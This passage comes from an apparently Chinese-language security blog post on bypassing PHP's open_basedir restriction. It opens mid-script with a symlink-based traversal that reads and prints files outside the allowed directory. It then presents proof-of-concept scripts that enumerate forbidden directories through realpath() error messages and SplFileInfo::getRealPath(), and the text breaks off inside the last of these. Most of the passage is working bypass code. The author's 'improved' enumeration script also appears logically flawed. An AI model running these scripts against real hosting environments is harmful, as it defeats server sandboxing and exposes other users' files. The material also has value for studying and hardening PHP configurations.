+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;=</span> <span class="nv">$j</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="nx">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$tmp</span> <span class="o">=</span> <span class="nx">array_fill</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nv">$j</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="nv">$name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">symlink</span><span class="p">(</span><span class="nx">implode</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="nv">$tmp</span><span class="p">),</span> <span class="s1">&#39;tmplink&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$tmp</span> <span class="o">=</span> <span class="nx">array_fill</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nv">$j</span><span class="p">,</span> <span class="s1">&#39;..&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">symlink</span><span class="p">(</span><span class="s1">&#39;tmplink/&#39;</span> <span class="o">.</span> <span class="nx">implode</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="nv">$tmp</span><span class="p">)</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">,</span> <span class="nv">$exp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">unlink</span><span class="p">(</span><span class="s1">&#39;tmplink&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">mkdir</span><span class="p">(</span><span class="s1">&#39;tmplink&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">delfile</span><span class="p">(</span><span class="nv">$name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$exp</span> <span class="o">=</span> <span class="nx">dirname</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;SCRIPT_NAME&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s2">&#34;/</span><span class="si">{</span><span class="nv">$exp</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$exp</span> <span class="o">=</span> <span class="s2">&#34;http://</span><span class="si">{</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;SERVER_NAME&#39;</span><span class="p">]</span><span class="si">}{</span><span class="nv">$exp</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">-----------------content---------------</span><span class="se">\n\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$exp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">delfile</span><span class="p">(</span><span class="s1">&#39;tmplink&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">getRelativePath</span><span class="p">(</span><span class="nv">$from</span><span class="p">,</span> <span class="nv">$to</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// some compatibility fixes for Windows paths
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nv">$from</span> <span class="o">=</span> <span class="nx">rtrim</span><span class="p">(</span><span class="nv">$from</span><span class="p">,</span> <span class="s1">&#39;\/&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$from</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;\\&#39;</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="nv">$from</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$to</span>   <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;\\&#39;</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="nv">$to</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nv">$from</span>   <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="nv">$from</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$to</span>     <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="nv">$to</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$relPath</span>  <span class="o">=</span> <span class="nv">$to</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">foreach</span><span class="p">(</span><span class="nv">$from</span> <span class="k">as</span> <span class="nv">$depth</span> <span class="o">=&gt;</span> <span class="nv">$dir</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// find first non-matching dir
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="nv">$dir</span> <span class="o">===</span> <span class="nv">$to</span><span class="p">[</span><span class="nv">$depth</span><span class="p">])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="c1">// ignore this directory
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nx">array_shift</span><span class="p">(</span><span class="nv">$relPath</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="c1">// get number of remaining dirs to $from
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nv">$remaining</span> <span class="o">=</span> <span class="nx">count</span><span class="p">(</span><span class="nv">$from</span><span class="p">)</span> <span class="o">-</span> <span class="nv">$depth</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span><span class="p">(</span><span class="nv">$remaining</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// add traversals up to first matching dir
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$padLength</span> <span class="o">=</span> <span class="p">(</span><span class="nx">count</span><span class="p">(</span><span class="nv">$relPath</span><span class="p">)</span> <span class="o">+</span> <span class="nv">$remaining</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$relPath</span> <span class="o">=</span> <span class="nx">array_pad</span><span class="p">(</span><span class="nv">$relPath</span><span class="p">,</span> <span class="nv">$padLength</span><span class="p">,</span> <span class="s1">&#39;..&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$relPath</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;./&#39;</span> <span class="o">.</span> <span class="nv">$relPath</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">implode</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="nv">$relPath</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">delfile</span><span class="p">(</span><span class="nv">$deldir</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nx">is_file</span><span class="p">(</span><span class="nv">$deldir</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="o">@</span><span class="nx">chmod</span><span class="p">(</span><span class="nv">$deldir</span><span class="p">,</span><span class="mo">0777</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="nv">$deldir</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nx">is_dir</span><span class="p">(</span><span class="nv">$deldir</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">((</span><span class="nv">$mydir</span> <span class="o">=</span> <span class="o">@</span><span class="nx">opendir</span><span class="p">(</span><span class="nv">$deldir</span><span class="p">))</span> <span class="o">==</span> <span class="k">NULL</span><span class="p">)</span> <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">while</span><span class="p">(</span><span class="k">false</span> <span class="o">!==</span> <span class="p">(</span><span class="nv">$file</span> <span class="o">=</span> <span class="o">@</span><span class="nx">readdir</span><span class="p">(</span><span class="nv">$mydir</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$name</span> <span class="o">=</span> <span class="nx">File_Str</span><span class="p">(</span><span class="nv">$deldir</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">((</span><span class="nv">$file</span><span class="o">!=</span><span class="s1">&#39;.&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$file</span><span class="o">!=</span><span class="s1">&#39;..&#39;</span><span class="p">)){</span><span class="nx">delfile</span><span class="p">(</span><span class="nv">$name</span><span class="p">);}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> 
+</span></span><span class="line"><span class="cl">        <span class="o">@</span><span class="nx">closedir</span><span class="p">(</span><span class="nv">$mydir</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">@</span><span class="nx">chmod</span><span class="p">(</span><span class="nv">$deldir</span><span class="p">,</span><span class="mo">0777</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">@</span><span class="nx">rmdir</span><span class="p">(</span><span class="nv">$deldir</span><span class="p">)</span> <span class="o">?</span> <span class="k">true</span> <span class="o">:</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">File_Str</span><span class="p">(</span><span class="nv">$string</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;//&#39;</span><span class="p">,</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;\\&#39;</span><span class="p">,</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="nv">$string</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">getRandStr</span><span class="p">(</span><span class="nv">$length</span> <span class="o">=</span> <span class="mi">6</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$chars</span> <span class="o">=</span> <span class="s1">&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$randStr</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$length</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$randStr</span> <span class="o">.=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$chars</span><span class="p">,</span> <span class="nx">mt_rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$chars</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">),</span> <span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$randStr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="realpath列举目录" class="headerLink">
+    <a href="#realpath%e5%88%97%e4%b8%be%e7%9b%ae%e5%bd%95" class="header-mark"></a>realpath列举目录</h1><p><strong>Realpath</strong>函数是php中将一个路径规范化成为绝对路径的方法，它可以去掉多余的../或./等跳转字符，能将相对路径转换成绝对路径。
+but，在开启了open_basedir以后，这个函数有个特点：当我们传入的路径是一个不存在的文件（目录）时，它将返回false；当我们传入一个不在open_basedir里的文件（目录）时，他将抛出错误（File is not within the allowed path(s)）。
+所以就是利用这个特性进行猜解，考虑到效率问题，所以利用了Windows下的通配符</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">,</span> <span class="nx">dirname</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="nx">printf</span><span class="p">(</span><span class="s2">&#34;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&#34;</span><span class="p">,</span> <span class="nx">ini_get</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">));</span> <span class="c1">//打印了当前open限制的目录
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">set_error_handler</span><span class="p">(</span><span class="s1">&#39;isexists&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$dir</span> <span class="o">=</span> <span class="s1">&#39;d:/test/&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$file</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$chars</span> <span class="o">=</span> <span class="s1">&#39;abcdefghijklmnopqrstuvwxyz0123456789_&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$chars</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$dir</span> <span class="o">.</span> <span class="nv">$chars</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&lt;&gt;&lt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">realpath</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">isexists</span><span class="p">(</span><span class="nv">$errno</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$regexp</span> <span class="o">=</span> <span class="s1">&#39;/File\((.*)\) is not within/&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">preg_match</span><span class="p">(</span><span class="nv">$regexp</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$matches</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">printf</span><span class="p">(</span><span class="s2">&#34;%s &lt;br/&gt;&#34;</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>脚本可以列出D:/test/下的文件目录，当然这个只在Windows下适用在linux下面不适用
+这里还有一个缺点就是不能列出来首字母相同的文件，所以我打算改进一下p神的脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// 设置 open_basedir 指令
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">,</span> <span class="nx">dirname</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 打印 open_basedir 限制
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">echo</span> <span class="s2">&#34;&lt;b&gt;open_basedir: &#34;</span> <span class="o">.</span> <span class="nx">ini_get</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&#34;&lt;/b&gt;&lt;br /&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 定义自定义错误处理程序
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">set_error_handler</span><span class="p">(</span><span class="s1">&#39;isexists&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 目录和字符
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$dir</span> <span class="o">=</span> <span class="s1">&#39;d:/test/&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$chars</span> <span class="o">=</span> <span class="s1">&#39;abcdefghijklmnopqrstuvwxyz0123456789_&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 迭代字符
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$chars</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$dir</span> <span class="o">.</span> <span class="nv">$chars</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&lt;&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// 尝试访问文件
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$realpath</span> <span class="o">=</span> <span class="nx">realpath</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$realpath</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">// 文件无法访问
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nx">trigger_error</span><span class="p">(</span><span class="s2">&#34;File </span><span class="si">$file</span><span class="s2"> is not within allowed directories.&#34;</span><span class="p">,</span> <span class="nx">E_USER_WARNING</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 如果下一个字符的首字母与当前字符的首字母相同，则跳过
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">while</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$chars</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nv">$chars</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">==</span> <span class="nv">$chars</span><span class="p">[</span><span class="nv">$i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 自定义错误处理程序函数
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">function</span> <span class="nf">isexists</span><span class="p">(</span><span class="nv">$errno</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$regexp</span> <span class="o">=</span> <span class="s1">&#39;/File\((.*)\) is not within/&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="nv">$regexp</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;</span><span class="si">{</span><span class="nv">$matches</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="si">}</span><span class="s2">&lt;br /&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="利用splfileinfogetrealpath列举目录" class="headerLink">
+    <a href="#%e5%88%a9%e7%94%a8splfileinfogetrealpath%e5%88%97%e4%b8%be%e7%9b%ae%e5%bd%95" class="header-mark"></a>利用SplFileInfo::getRealPath()列举目录</h1><p><strong>SplFileInfo</strong>类是PHP5.1.2之后引入的一个类，提供一个对文件进行操作的接口。其中有一个和realpath名字很像的方法叫getRealPath。</p>
+<p>这个方法功能和realpath类似，都是获取绝对路径用的。我们在SplFileInfo的构造函数中传入文件相对路径，并且调用getRealPath即可获取文件的绝对路径。</p>
+<p>这个方法有个特点：<strong>完全没有考虑open_basedir</strong>。在传入的路径为一个不存在的路径时，会返回false；在传入的路径为一个存在的路径时，会正常返回绝对路径。
+所以不像realpath需要考虑是否在open_basedir下面的条件</p>
+<p>P神POC</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">,</span> <span class="nx">dirname</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="nx">printf</span><span class="p">(</span><span class="s2">&#34;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&#34;</span><span class="p">,</span> <span class="nx">ini_get</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$basedir</span> <span class="o">=</span> <span class="s1">&#39;D:/test/&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$arr</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$chars</span> <span class="o">=</span> <span class="s1">&#39;abcdefghijklmnopqrstuvwxyz0123456789&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$chars</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="nv">$info</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SplFileInfo</span><span class="p">(</span><span class="nv">$basedir</span> <span class="o">.</span> <span class="nv">$chars</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&lt;&gt;&lt;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$re</span> <span class="o">=</span> <span class="nv">$info</span><span class="o">-&gt;</span><span class="na">getRealPath</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$re</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">dump</span><span class="p">(</span><span class="nv">$re</span><span class="p">);</span>
